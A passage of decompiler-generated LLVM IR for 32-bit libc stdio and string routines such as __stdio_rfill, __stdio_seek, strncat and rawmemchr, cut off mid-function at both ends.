  %v1_804f953 = add nsw i32 %v2_804f94d, -1
  %tmp12 = icmp slt i32 %v3_804f94f, 1
  br i1 %tmp12, label %dec_label_pc_804f95e, label %dec_label_pc_804f958

dec_label_pc_804f958:                             ; preds = %dec_label_pc_804f949
  %v1_804f958 = add i32 %tmp6, 2
  %v2_804f958 = inttoptr i32 %v1_804f958 to i8*
  %v3_804f958 = load i8, i8* %v2_804f958, align 1
  %v4_804f958 = zext i8 %v3_804f958 to i32
  %v2_804f95c = sub nsw i32 %v1_804f953, %v4_804f958
  br label %dec_label_pc_804f95e

dec_label_pc_804f95e:                             ; preds = %dec_label_pc_804f949, %dec_label_pc_804f939, %dec_label_pc_804f934, %entry, %dec_label_pc_804f958
  %v0_804f975 = phi i32 [ %v1_804f953, %dec_label_pc_804f949 ], [ %v1_804f936, %dec_label_pc_804f939 ], [ 0, %dec_label_pc_804f934 ], [ 0, %entry ], [ %v2_804f95c, %dec_label_pc_804f958 ]
  %v2_804f95e = and i32 %v2_804f928, 64
  %v3_804f95e = icmp eq i32 %v2_804f95e, 0
  %storemerge.in.in.v = select i1 %v3_804f95e, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp6
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_804f96d = add i32 %tmp6, 16
  %v3_804f96d = inttoptr i32 %v2_804f96d to i32*
  %v4_804f96d = load i32, i32* %v3_804f96d, align 4
  %v5_804f96d = sub i32 %storemerge, %v4_804f96d
  %v1_804f970 = inttoptr i32 %arg2 to i32*
  %v2_804f970 = load i32, i32* %v1_804f970, align 4
  store i32 %v2_804f970, i32* %ecx.global-to-local, align 4
  %v1_804f972 = add i32 %arg2, 4
  %v2_804f972 = inttoptr i32 %v1_804f972 to i32*
  %v3_804f972 = load i32, i32* %v2_804f972, align 4
  store i32 %v3_804f972, i32* %ebx.global-to-local, align 4
  %v2_804f975 = add i32 %v5_804f96d, %v0_804f975
  store i32 %v2_804f975, i32* %esi.global-to-local, align 4
  %v2_804f980 = ashr i32 %v2_804f975, 31
  %v5_804f989 = sub i32 %v2_804f970, %v2_804f975
  %v10_804f989 = icmp ult i32 %v2_804f970, %v2_804f975
  %v6_804f98d = zext i1 %v10_804f989 to i32
  %tmp = icmp slt i32 %v2_804f975, 0
  %v2_804f980.neg = zext i1 %tmp to i32
  %v7_804f98d = add i32 %v3_804f972, %v2_804f980.neg
  %v8_804f98d = add i32 %v7_804f98d, %v6_804f98d
  store i32 %v8_804f98d, i32* @edx, align 4
  store i32 %v5_804f989, i32* %v1_804f970, align 4
  %v0_804f993 = load i32, i32* @edx, align 4
  %v1_804f993 = load i32, i32* %edi.global-to-local, align 4
  %v2_804f993 = add i32 %v1_804f993, 4
  %v3_804f993 = inttoptr i32 %v2_804f993 to i32*
  store i32 %v0_804f993, i32* %v3_804f993, align 4
  %v0_804f996 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f996 = add i32 %v0_804f996, 4
  %v2_804f996 = inttoptr i32 %v1_804f996 to i32*
  %v3_804f996 = load i32, i32* %v2_804f996, align 4
  %v4_804f996 = load i32, i32* %ebx.global-to-local, align 4
  %v5_804f999 = icmp slt i32 %v3_804f996, %v4_804f996
  br i1 %v5_804f999, label %dec_label_pc_804f9a3, label %dec_label_pc_804f99b

dec_label_pc_804f99b:                             ; preds = %dec_label_pc_804f95e
  %v8_804f99b = icmp sgt i32 %v3_804f996, %v4_804f996
  br i1 %v8_804f99b, label %dec_label_pc_804f9a1, label %dec_label_pc_804f99d

dec_label_pc_804f99d:                             ; preds = %dec_label_pc_804f99b
  %v1_804f99d = inttoptr i32 %v0_804f996 to i32*
  %v2_804f99d = load i32, i32* %v1_804f99d, align 4
  %v3_804f99d = load i32, i32* %ecx.global-to-local, align 4
  %tmp14 = icmp ugt i32 %v2_804f99d, %v3_804f99d
  br i1 %tmp14, label %dec_label_pc_804f9a1, label %dec_label_pc_804f9a3

dec_label_pc_804f9a1:                             ; preds = %dec_label_pc_804f99d, %dec_label_pc_804f99b
  %v0_804f9a1 = load i32, i32* %esi.global-to-local, align 4
  %v1_804f9a1 = sub i32 0, %v0_804f9a1
  store i32 %v1_804f9a1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f9a3

dec_label_pc_804f9a3:                             ; preds = %dec_label_pc_804f99d, %dec_label_pc_804f95e, %dec_label_pc_804f9a1
  %v0_804f9a3 = load i32, i32* %esi.global-to-local, align 4
  %v2_804f9a3 = icmp slt i32 %v0_804f9a3, 0
  %v1_804f9a5 = icmp eq i1 %v2_804f9a3, false
  br i1 %v1_804f9a5, label %dec_label_pc_804f9b7, label %dec_label_pc_804f9a7

dec_label_pc_804f9a7:                             ; preds = %dec_label_pc_804f9a3
  %v1_804f9a7 = call i32 @__errno_location(i32 %v2_804f980)
  %v1_804f9ac = inttoptr i32 %v1_804f9a7 to i32*
  store i32 75, i32* %v1_804f9ac, align 4
  %v0_804f9ba.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f9b7

dec_label_pc_804f9b4:                             ; preds = %dec_label_pc_804f943, %dec_label_pc_804f93e
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f9b7

dec_label_pc_804f9b7:                             ; preds = %dec_label_pc_804f9a3, %dec_label_pc_804f9a7, %dec_label_pc_804f9b4
  %v0_804f9ba = phi i32 [ %v0_804f9a3, %dec_label_pc_804f9a3 ], [ %v0_804f9ba.pre, %dec_label_pc_804f9a7 ], [ -1, %dec_label_pc_804f9b4 ]
  ret i32 %v0_804f9ba

; uselistorder directives
  uselistorder i32 %v4_804f996, { 1, 0 }
  uselistorder i32 %v3_804f996, { 1, 0 }
  uselistorder i32 %v1_804f936, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v1_804f92f, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %v2_804f928, { 2, 1, 0, 3 }
  uselistorder i32 %tmp6, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32 75, { 1, 0 }
  uselistorder i32 2048, { 1, 0, 4, 2, 3 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f9b7, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f9a3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f95e, { 4, 0, 1, 2, 3 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v0_804f9c0 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804f9c8 = add i32 %arg1, 8
  %v2_804f9c8 = inttoptr i32 %v1_804f9c8 to i32*
  %v3_804f9c8 = load i32, i32* %v2_804f9c8, align 4
  store i32 %v3_804f9c8, i32* %edx.global-to-local, align 4
  %v1_804f9cb = add i32 %arg1, 12
  %v2_804f9cb = inttoptr i32 %v1_804f9cb to i32*
  %v3_804f9cb = load i32, i32* %v2_804f9cb, align 4
  %v2_804f9ce = sub i32 %v3_804f9cb, %v3_804f9c8
  %v3_804f9d3 = inttoptr i32 %arg1 to i16*
  %v4_804f9d3 = call i32 @__stdio_READ(i16* %v3_804f9d3, i32 %v3_804f9c8, i32 %v2_804f9ce)
  %v0_804f9d8 = load i32, i32* @ebx, align 4
  %v1_804f9d8 = add i32 %v0_804f9d8, 8
  %v2_804f9d8 = inttoptr i32 %v1_804f9d8 to i32*
  %v3_804f9d8 = load i32, i32* %v2_804f9d8, align 4
  store i32 %v3_804f9d8, i32* %edx.global-to-local, align 4
  %v2_804f9db = add i32 %v0_804f9d8, 16
  %v3_804f9db = inttoptr i32 %v2_804f9db to i32*
  store i32 %v3_804f9d8, i32* %v3_804f9db, align 4
  %v0_804f9de = load i32, i32* %edx.global-to-local, align 4
  %v2_804f9de = add i32 %v0_804f9de, %v4_804f9d3
  store i32 %v2_804f9de, i32* %edx.global-to-local, align 4
  %v1_804f9e0 = load i32, i32* @ebx, align 4
  %v2_804f9e0 = add i32 %v1_804f9e0, 20
  %v3_804f9e0 = inttoptr i32 %v2_804f9e0 to i32*
  store i32 %v2_804f9de, i32* %v3_804f9e0, align 4
  store i32 %v0_804f9c0, i32* @ebx, align 4
  ret i32 %v4_804f9d3

; uselistorder directives
  uselistorder i32 %v4_804f9d3, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_804f9e8 = load i32, i32* @ebx, align 4
  %v4_804f9ec = ptrtoint i16* %arg1 to i32
  store i32 %v4_804f9ec, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v1_804f9f4 = bitcast i16* %arg1 to i32*
  %v2_804f9f4 = load i32, i32* %v1_804f9f4, align 4
  %v1_804f9f6 = urem i32 %v2_804f9f4, 65536
  %v2_804f9f9 = and i32 %v1_804f9f6, %arg2
  %v3_804f9f9 = icmp eq i32 %v2_804f9f9, 0
  %v1_804f9fb = icmp eq i1 %v3_804f9f9, false
  br i1 %v1_804f9fb, label %dec_label_pc_804fa0a, label %dec_label_pc_804f9fd

dec_label_pc_804f9fd:                             ; preds = %entry
  %v1_804f9fd = and i32 %v2_804f9f4, 2176
  %v2_804f9fd = icmp eq i32 %v1_804f9fd, 0
  %v1_804fa03 = icmp eq i1 %v2_804f9fd, false
  br i1 %v1_804fa03, label %dec_label_pc_804fa11, label %dec_label_pc_804fa05

dec_label_pc_804fa05:                             ; preds = %dec_label_pc_804f9fd
  %v2_804fa05 = or i32 %v2_804f9f4, %arg2
  %v1_804fa07 = trunc i32 %v2_804fa05 to i16
  store i16 %v1_804fa07, i16* %arg1, align 2
  %v0_804fa0a.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804fa0a

dec_label_pc_804fa0a:                             ; preds = %entry, %dec_label_pc_804fa05
  %v0_804fa2c = phi i32 [ %v4_804f9ec, %entry ], [ %v0_804fa0a.pre, %dec_label_pc_804fa05 ]
  %v1_804fa0a = inttoptr i32 %v0_804fa2c to i16*
  %v2_804fa0a = load i16, i16* %v1_804fa0a, align 2
  %v2_804fa0d = and i16 %v2_804fa0a, 16
  %v3_804fa0d = icmp eq i16 %v2_804fa0d, 0
  br i1 %v3_804fa0d, label %dec_label_pc_804fa25, label %dec_label_pc_804fa11

dec_label_pc_804fa11:                             ; preds = %dec_label_pc_804fa0a, %dec_label_pc_804f9fd
  %v1_804fa11 = call i32 @__errno_location(i32 %v0_804f9e8)
  %v1_804fa16 = inttoptr i32 %v1_804fa11 to i32*
  store i32 9, i32* %v1_804fa16, align 4
  br label %dec_label_pc_804fa1c

dec_label_pc_804fa1c:                             ; preds = %dec_label_pc_804fa29, %dec_label_pc_804fa11
  %v0_804fa1c = load i32, i32* @ebx, align 4
  %v1_804fa1c = inttoptr i32 %v0_804fa1c to i16*
  %v2_804fa1c = load i16, i16* %v1_804fa1c, align 2
  %v3_804fa1c = or i16 %v2_804fa1c, 8
  store i16 %v3_804fa1c, i16* %v1_804fa1c, align 2
  br label %dec_label_pc_804fa49

dec_label_pc_804fa25:                             ; preds = %dec_label_pc_804fa0a
  %v2_804fa25 = and i16 %v2_804fa0a, 64
  %v3_804fa25 = icmp eq i16 %v2_804fa25, 0
  br i1 %v3_804fa25, label %dec_label_pc_804fa43, label %dec_label_pc_804fa29

dec_label_pc_804fa29:                             ; preds = %dec_label_pc_804fa25
  %v2_804fa2d = call i32 @__stdio_wcommit(i32 %v0_804fa2c)
  %v1_804fa35 = icmp eq i32 %v2_804fa2d, 0
  %v1_804fa37 = icmp eq i1 %v1_804fa35, false
  br i1 %v1_804fa37, label %dec_label_pc_804fa1c, label %dec_label_pc_804fa39

dec_label_pc_804fa39:                             ; preds = %dec_label_pc_804fa29
  %v0_804fa39 = load i32, i32* @ebx, align 4
  %v1_804fa39 = inttoptr i32 %v0_804fa39 to i16*
  %v2_804fa39 = load i16, i16* %v1_804fa39, align 2
  %v3_804fa39 = and i16 %v2_804fa39, -65
  store i16 %v3_804fa39, i16* %v1_804fa39, align 2
  %v0_804fa3d = load i32, i32* @ebx, align 4
  %v1_804fa3d = add i32 %v0_804fa3d, 8
  %v2_804fa3d = inttoptr i32 %v1_804fa3d to i32*
  %v3_804fa3d = load i32, i32* %v2_804fa3d, align 4
  %v2_804fa40 = add i32 %v0_804fa3d, 28
  %v3_804fa40 = inttoptr i32 %v2_804fa40 to i32*
  store i32 %v3_804fa3d, i32* %v3_804fa40, align 4
  %v0_804fa43.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804fa43

dec_label_pc_804fa43:                             ; preds = %dec_label_pc_804fa25, %dec_label_pc_804fa39
  %v9_804fa43 = phi i32 [ %v0_804fa2c, %dec_label_pc_804fa25 ], [ %v0_804fa43.pre, %dec_label_pc_804fa39 ]
  %v1_804fa43 = inttoptr i32 %v9_804fa43 to i16*
  %v2_804fa43 = load i16, i16* %v1_804fa43, align 2
  %v3_804fa43 = or i16 %v2_804fa43, 1
  store i16 %v3_804fa43, i16* %v1_804fa43, align 2
  br label %dec_label_pc_804fa49

dec_label_pc_804fa49:                             ; preds = %dec_label_pc_804fa1c, %dec_label_pc_804fa43
  %storemerge = phi i32 [ 0, %dec_label_pc_804fa43 ], [ -1, %dec_label_pc_804fa1c ]
  store i32 %v0_804f9e8, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_804f9f4, { 1, 2, 0 }
  uselistorder i32 %v0_804f9e8, { 1, 0 }
  uselistorder i16 1, { 1, 2, 0 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 6, 4, 2, 1, 5, 3, 0 }
  uselistorder i16 8, { 1, 2, 0, 3, 5, 4 }
  uselistorder i16 0, { 0, 4, 1, 5, 2, 3, 6 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804fa49, { 1, 0 }
  uselistorder label %dec_label_pc_804fa43, { 1, 0 }
  uselistorder label %dec_label_pc_804fa0a, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg2 to i32
  store i32 %tmp5, i32* @ebx, align 4
  %v1_804fa5c = add i32 %tmp5, 4
  %v2_804fa5c = inttoptr i32 %v1_804fa5c to i32*
  %v3_804fa5c = load i32, i32* %v2_804fa5c, align 4
  %v2_804fa5f = load i32, i32* %arg2, align 4
  %v1_804fa65 = add i32 %arg1, 4
  %v2_804fa65 = inttoptr i32 %v1_804fa65 to i32*
  %v3_804fa65 = load i32, i32* %v2_804fa65, align 4
  %v4_804fa68 = call i32 @__libc_lseek64(i32 %v3_804fa65, i32 %v2_804fa5f, i32 %v3_804fa5c, i32 %arg3)
  %v0_804fa72 = load i32, i32* @edx, align 4
  %v2_804fa72 = icmp slt i32 %v0_804fa72, 0
  br i1 %v2_804fa72, label %dec_label_pc_804fa7d, label %dec_label_pc_804fa76

dec_label_pc_804fa76:                             ; preds = %entry
  %v1_804fa76 = load i32, i32* @ebx, align 4
  %v2_804fa76 = inttoptr i32 %v1_804fa76 to i32*
  store i32 %v4_804fa68, i32* %v2_804fa76, align 4
  %v0_804fa78 = load i32, i32* @edx, align 4
  %v1_804fa78 = load i32, i32* @ebx, align 4
  %v2_804fa78 = add i32 %v1_804fa78, 4
  %v3_804fa78 = inttoptr i32 %v2_804fa78 to i32*
  store i32 %v0_804fa78, i32* %v3_804fa78, align 4
  br label %dec_label_pc_804fa7d

dec_label_pc_804fa7d:                             ; preds = %entry, %dec_label_pc_804fa76
  %v0_804fa7d = phi i32 [ %v4_804fa68, %entry ], [ 0, %dec_label_pc_804fa76 ]
  ret i32 %v0_804fa7d

; uselistorder directives
  uselistorder i32 %tmp5, { 1, 0 }
  uselistorder label %dec_label_pc_804fa7d, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_804fa86 = ptrtoint i8* %arg1 to i32
  %v4_804fa8e.pre = load i32, i32* @eax, align 4
  %v8_804fa8e.pre = load i1, i1* @df, align 1
  %v9_804fa8e = select i1 %v8_804fa8e.pre, i32 -1, i32 1
  br label %dec_label_pc_804fa8e

dec_label_pc_804fa8e:                             ; preds = %dec_label_pc_804fa92, %entry
  %v20_804fa8f = phi i32 [ %v23_804fa8f, %dec_label_pc_804fa92 ], [ %arg2, %entry ]
  %v4_804fa8e = phi i32 [ %v6_804fa8e, %dec_label_pc_804fa92 ], [ %v4_804fa8e.pre, %entry ]
  %v7_804fa8e = phi i32 [ %v10_804fa8e, %dec_label_pc_804fa92 ], [ %v4_804fa86, %entry ]
  %v1_804fa8e = inttoptr i32 %v7_804fa8e to i8*
  %v2_804fa8e = load i8, i8* %v1_804fa8e, align 1
  %v3_804fa8f = inttoptr i32 %v20_804fa8f to i8*
  %v4_804fa8f = load i8, i8* %v3_804fa8f, align 1
  %v15_804fa8f = icmp eq i8 %v2_804fa8e, %v4_804fa8f
  %v1_804fa90 = icmp eq i1 %v15_804fa8f, false
  br i1 %v1_804fa90, label %dec_label_pc_804fa9a, label %dec_label_pc_804fa92

dec_label_pc_804fa92:                             ; preds = %dec_label_pc_804fa8e
  %v3_804fa8e = zext i8 %v2_804fa8e to i32
  %v5_804fa8e = and i32 %v4_804fa8e, -256
  %v6_804fa8e = or i32 %v3_804fa8e, %v5_804fa8e
  %v23_804fa8f = add i32 %v20_804fa8f, %v9_804fa8e
  %v10_804fa8e = add i32 %v7_804fa8e, %v9_804fa8e
  %v4_804fa92 = icmp eq i8 %v2_804fa8e, 0
  %v1_804fa94 = icmp eq i1 %v4_804fa92, false
  br i1 %v1_804fa94, label %dec_label_pc_804fa8e, label %dec_label_pc_804fa9e

dec_label_pc_804fa9a:                             ; preds = %dec_label_pc_804fa8e
  br label %dec_label_pc_804fa9e

dec_label_pc_804fa9e:                             ; preds = %dec_label_pc_804fa92, %dec_label_pc_804fa9a
  %storemerge = phi i32 [ 1, %dec_label_pc_804fa9a ], [ 0, %dec_label_pc_804fa92 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_804fa8e, { 1, 2, 0 }
  uselistorder i32 %v9_804fa8e, { 1, 0 }
  uselistorder label %dec_label_pc_804fa9e, { 1, 0 }
}

define i32 @__GI_strncat() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-8 = alloca i32, align 4
  %v0_804faa5 = load i32, i32* @esi, align 4
  store i32 %v0_804faa5, i32* %stack_var_-8, align 4
  %v4_804faa6 = ptrtoint i8* %tmp5 to i32
  store i32 %v4_804faa6, i32* %esi.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v4_804fab3 = inttoptr i32 %tmp to i8*
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v3_804fab7 = call i32 @_strlen(i8* %v4_804fab3)
  %v2_804fab9 = add i32 %tmp, -1
  store i32 %v2_804fab9, i32* %edi.global-to-local, align 4
  %v0_804faba = load i32, i32* %edx.global-to-local, align 4
  %v8_804fabd10 = icmp eq i32 %v0_804faba, 0
  store i32 %v0_804faba, i32* %ecx.global-to-local, align 4
  br i1 %v8_804fabd10, label %dec_label_pc_804fac8, label %dec_label_pc_804fac0.lr.ph

dec_label_pc_804fac0.lr.ph:                       ; preds = %entry
  %v4_804fac0.pre = load i32, i32* %eax.global-to-local, align 4
  %v8_804fac0.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_804fac0

dec_label_pc_804fac0:                             ; preds = %dec_label_pc_804fac0.lr.ph, %dec_label_pc_804fac0.dec_label_pc_804fabd_crit_edge
  %v8_804fac0 = phi i1 [ %v8_804fac0.pre, %dec_label_pc_804fac0.lr.ph ], [ %v5_804fac1, %dec_label_pc_804fac0.dec_label_pc_804fabd_crit_edge ]
  %v4_804fac0 = phi i32 [ %v4_804fac0.pre, %dec_label_pc_804fac0.lr.ph ], [ %v0_804fac2, %dec_label_pc_804fac0.dec_label_pc_804fabd_crit_edge ]
  %v2_804faca11 = phi i32 [ %v2_804fab9, %dec_label_pc_804fac0.lr.ph ], [ %v7_804fac1, %dec_label_pc_804fac0.dec_label_pc_804fabd_crit_edge ]
  %v0_804fac0 = load i32, i32* %esi.global-to-local, align 4
  %v1_804fac0 = inttoptr i32 %v0_804fac0 to i8*
  %v2_804fac0 = load i8, i8* %v1_804fac0, align 1
  %v3_804fac0 = zext i8 %v2_804fac0 to i32
  %v5_804fac0 = and i32 %v4_804fac0, -256
  %v6_804fac0 = or i32 %v5_804fac0, %v3_804fac0
  store i32 %v6_804fac0, i32* %eax.global-to-local, align 4
  %v9_804fac0 = select i1 %v8_804fac0, i32 -1, i32 1
  %v10_804fac0 = add i32 %v9_804fac0, %v0_804fac0
  store i32 %v10_804fac0, i32* %esi.global-to-local, align 4
  %v3_804fac1 = inttoptr i32 %v2_804faca11 to i8*
  store i8 %v2_804fac0, i8* %v3_804fac1, align 1
  %v4_804fac1 = load i32, i32* %edi.global-to-local, align 4
  %v5_804fac1 = load i1, i1* @df, align 1
  %v6_804fac1 = select i1 %v5_804fac1, i32 -1, i32 1
  %v7_804fac1 = add i32 %v6_804fac1, %v4_804fac1
  store i32 %v7_804fac1, i32* %edi.global-to-local, align 4
  %v0_804fac2 = load i32, i32* %eax.global-to-local, align 4
  %v3_804fac2 = trunc i32 %v0_804fac2 to i8
  %v4_804fac2 = icmp eq i8 %v3_804fac2, 0
  %v1_804fac4 = icmp eq i1 %v4_804fac2, false
  br i1 %v1_804fac4, label %dec_label_pc_804fac0.dec_label_pc_804fabd_crit_edge, label %dec_label_pc_804facb

dec_label_pc_804fac0.dec_label_pc_804fabd_crit_edge: ; preds = %dec_label_pc_804fac0
  %v0_804fabd.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_804fabd = add i32 %v0_804fabd.pre, -1
  %v8_804fabd = icmp eq i32 %v1_804fabd, 0
  store i32 %v1_804fabd, i32* %ecx.global-to-local, align 4
  br i1 %v8_804fabd, label %dec_label_pc_804fac8, label %dec_label_pc_804fac0

dec_label_pc_804fac8:                             ; preds = %dec_label_pc_804fac0.dec_label_pc_804fabd_crit_edge, %entry
  %v2_804faca.lcssa = phi i32 [ %v2_804fab9, %entry ], [ %v7_804fac1, %dec_label_pc_804fac0.dec_label_pc_804fabd_crit_edge ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_804faca = inttoptr i32 %v2_804faca.lcssa to i8*
  store i8 0, i8* %v3_804faca, align 1
  %v4_804faca = load i32, i32* %edi.global-to-local, align 4
  %v5_804faca = load i1, i1* @df, align 1
  %v6_804faca = select i1 %v5_804faca, i32 -1, i32 1
  %v7_804faca = add i32 %v6_804faca, %v4_804faca
  store i32 %v7_804faca, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804facb

dec_label_pc_804facb:                             ; preds = %dec_label_pc_804fac0, %dec_label_pc_804fac8
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v2_804facf = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804facf, i32* @esi, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v1_804fabd, { 1, 0 }
  uselistorder i32 %v0_804fac2, { 1, 0 }
  uselistorder i32 %v7_804fac1, { 0, 2, 1 }
  uselistorder i1 %v5_804fac1, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 0, 1, 2 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804facb, { 1, 0 }
  uselistorder label %dec_label_pc_804fac0, { 1, 0 }
}

define i32 @rawmemchr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_804fad5 = load i32, i32* @ebx, align 4
  %v4_804fad6 = urem i32 %arg2, 256
  %v4_804fada = ptrtoint i8* %arg1 to i32
  %v2_804fae53 = urem i32 %v4_804fada, 4
  %v3_804fae54 = icmp eq i32 %v2_804fae53, 0
  %v1_804fae78 = icmp eq i1 %v3_804fae54, false
  %v4_804fae0 = trunc i32 %arg2 to i8
  br i1 %v1_804fae78, label %dec_label_pc_804fae0, label %dec_label_pc_804fae9

dec_label_pc_804fae0:                             ; preds = %entry, %dec_label_pc_804fae4
  %v0_804fae4 = phi i32 [ %v1_804fae4, %dec_label_pc_804fae4 ], [ %v4_804fada, %entry ]
  %v1_804fae0 = inttoptr i32 %v0_804fae4 to i8*
  %v2_804fae0 = load i8, i8* %v1_804fae0, align 1
  %v15_804fae0 = icmp eq i8 %v2_804fae0, %v4_804fae0
  br i1 %v15_804fae0, label %dec_label_pc_804fb34, label %dec_label_pc_804fae4

dec_label_pc_804fae4:                             ; preds = %dec_label_pc_804fae0
  %v1_804fae4 = add i32 %v0_804fae4, 1
  %v2_804fae5 = urem i32 %v1_804fae4, 4
  %v3_804fae5 = icmp eq i32 %v2_804fae5, 0
  %v1_804fae7 = icmp eq i1 %v3_804fae5, false
  br i1 %v1_804fae7, label %dec_label_pc_804fae0, label %dec_label_pc_804fae9

dec_label_pc_804fae9:                             ; preds = %entry, %dec_label_pc_804fae4
  %v0_804faec = phi i32 [ %v1_804fae4, %dec_label_pc_804fae4 ], [ %v4_804fada, %entry ]
  %v2_804faf0 = mul nuw nsw i32 %v4_804fad6, 256
  %v2_804faf3 = or i32 %v2_804faf0, %v4_804fad6
  %v2_804faf7 = mul i32 %v2_804faf3, 65536
  %v2_804fafa = or i32 %v2_804faf7, %v2_804faf3
  br label %dec_label_pc_804fafc

dec_label_pc_804fafc:                             ; preds = %dec_label_pc_804fb2c, %dec_label_pc_804fafc, %dec_label_pc_804fae9
  %v0_804fb00 = phi i32 [ %v0_804faec, %dec_label_pc_804fae9 ], [ %v1_804fb00, %dec_label_pc_804fafc ], [ %v1_804fb00, %dec_label_pc_804fb2c ]
  %v2_804fafe = inttoptr i32 %v0_804fb00 to i32*
  %v3_804fafe = load i32, i32* %v2_804fafe, align 4
  %v4_804fafe = xor i32 %v3_804fafe, %v2_804fafa
  %v1_804fb00 = add i32 %v0_804fb00, 4
  %v1_804fb03 = add i32 %v4_804fafe, 2130640639
  %v1_804fb09 = sub i32 -1, %v4_804fafe
  %v2_804fb0b = xor i32 %v1_804fb03, %v1_804fb09
  %v1_804fb0d = and i32 %v2_804fb0b, -2130640640
  %v2_804fb0d = icmp eq i32 %v1_804fb0d, 0
  br i1 %v2_804fb0d, label %dec_label_pc_804fafc, label %dec_label_pc_804fb14

dec_label_pc_804fb14:                             ; preds = %dec_label_pc_804fafc
  %v2_804fb17 = inttoptr i32 %v0_804fb00 to i8*
  %v3_804fb17 = load i8, i8* %v2_804fb17, align 1
  %v16_804fb17 = icmp eq i8 %v3_804fb17, %v4_804fae0
  br i1 %v16_804fb17, label %dec_label_pc_804fb34, label %dec_label_pc_804fb1c

dec_label_pc_804fb1c:                             ; preds = %dec_label_pc_804fb14
  %v1_804fb1c = add i32 %v0_804fb00, 1
  %v2_804fb1f = inttoptr i32 %v1_804fb1c to i8*
  %v3_804fb1f = load i8, i8* %v2_804fb1f, align 1
  %v16_804fb1f = icmp eq i8 %v3_804fb1f, %v4_804fae0
  br i1 %v16_804fb1f, label %dec_label_pc_804fb34, label %dec_label_pc_804fb24

dec_label_pc_804fb24:                             ; preds = %dec_label_pc_804fb1c
  %v1_804fb24 = add i32 %v0_804fb00, 2
  %v2_804fb27 = inttoptr i32 %v1_804fb24 to i8*
  %v3_804fb27 = load i8, i8* %v2_804fb27, align 1
  %v16_804fb27 = icmp eq i8 %v3_804fb27, %v4_804fae0
  br i1 %v16_804fb27, label %dec_label_pc_804fb34, label %dec_label_pc_804fb2c

dec_label_pc_804fb2c:                             ; preds = %dec_label_pc_804fb24
  %v1_804fb2c = add i32 %v0_804fb00, 3
  %v2_804fb2f = inttoptr i32 %v1_804fb2c to i8*
  %v3_804fb2f = load i8, i8* %v2_804fb2f, align 1
  %v16_804fb2f = icmp eq i8 %v3_804fb2f, %v4_804fae0
  %v1_804fb32 = icmp eq i1 %v16_804fb2f, false
  br i1 %v1_804fb32, label %dec_label_pc_804fafc, label %dec_label_pc_804fb34

dec_label_pc_804fb34:                             ; preds = %dec_label_pc_804fae0, %dec_label_pc_804fb2c, %dec_label_pc_804fb24, %dec_label_pc_804fb1c, %dec_label_pc_804fb14
  %v0_804fb36 = phi i32 [ %v1_804fb2c, %dec_label_pc_804fb2c ], [ %v1_804fb24, %dec_label_pc_804fb24 ], [ %v1_804fb1c, %dec_label_pc_804fb1c ], [ %v0_804fb00, %dec_label_pc_804fb14 ], [ %v0_804fae4, %dec_label_pc_804fae0 ]
  store i32 %v0_804fad5, i32* @ebx, align 4
  ret i32 %v0_804fb36

; uselistorder directives
  uselistorder i32 %v1_804fb00, { 1, 0 }
  uselistorder i32 %v2_804faf3, { 1, 0 }
  uselistorder i32 %v1_804fae4, { 1, 0, 2 }
  uselistorder i32 %v4_804fada, { 2, 1, 0 }
  uselistorder i32 %v4_804fad6, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
